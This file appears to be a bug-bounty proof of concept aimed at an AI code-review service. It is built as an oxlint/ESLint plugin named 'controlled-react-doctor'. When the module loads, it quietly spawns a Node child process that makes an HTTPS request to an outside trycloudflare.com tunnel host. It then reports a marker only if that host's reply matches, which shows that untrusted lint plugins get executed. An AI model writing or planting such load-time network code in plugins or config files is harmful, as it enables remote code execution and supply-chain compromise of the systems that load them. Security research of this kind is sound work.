import { execFileSync } from "node:child_process";

const isLocalControl = Boolean(process.env.CR_H1_REACT_DOCTOR_LOCAL_CONTROL);
const callbackPath = isLocalControl
  ? "/react-doctor-pr33-local"
  : "/react-doctor-pr33-load";
const expectedResponseMarker = isLocalControl
  ? "CR_H1_SAFE_REACT_DOCTOR_LOCAL_CALLBACK_RESPONSE_PR33"
  : "CR_H1_SAFE_REACT_DOCTOR_PRODUCTION_CALLBACK_RESPONSE_PR33";

const requestProgram = `
  const https = require("node:https");
  const request = https.get({
    hostname: process.argv[1],
    path: process.argv[2],
    headers: { "User-Agent": "CodeRabbit-H1-safe-React-Doctor-adoption-control" },
    timeout: 3000
  }, (response) => {
    let body = "";
    response.setEncoding("utf8");
    response.on("data", (chunk) => {
      if (body.length < 4096) body += chunk;
    });
    response.on("end", () => process.stdout.write(body.slice(0, 4096)));
  });
  request.on("error", () => process.exit(2));
  request.on("timeout", () => {
    request.destroy();
    process.exit(3);
  });
`;

let responseBody = "";
try {
  responseBody = execFileSync(
    process.execPath,
    ["-e", requestProgram, "charlotte-von-visit-smilies.trycloudflare.com", callbackPath],
    {
      encoding: "utf8",
      timeout: 5000,
      maxBuffer: 4096,
      stdio: ["ignore", "pipe", "ignore"]
    }
  );
} catch {}

const responseMarkerSeen = responseBody.includes(expectedResponseMarker);

export default {
  meta: { name: "controlled-react-doctor" },
  rules: {
    marker: {
      create(context) {
        if (!responseMarkerSeen) return {};
        return {
          Program(node) {
            context.report({
              node,
              message: "CR_H1_SAFE_REACT_DOCTOR_ADOPTED_OXLINT_PLUGIN_PR33"
            });
          }
        };
      }
    }
  }
};
